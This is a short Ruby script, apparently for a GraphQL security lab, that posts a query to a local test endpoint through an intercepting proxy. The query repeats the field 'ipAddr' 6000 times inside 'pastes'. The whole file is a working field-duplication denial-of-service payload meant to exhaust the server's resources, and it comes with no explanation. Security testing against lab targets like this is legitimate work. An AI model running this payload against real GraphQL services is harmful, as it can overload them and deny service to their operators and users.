require 'httpx'

copy_level = 6000
copy_pattern = 'ipAddr,'
payload = copy_pattern * copy_level

data = { 'query' => "query{pastes{#{payload}}}"}

HTTPX
  .plugin(:proxy)
  .with_proxy(uri: 'http://127.0.0.1:8080')
  .with(timeout: { operation_timeout: 120 })
  .post('http://noraj.test:5013/graphql', json: data)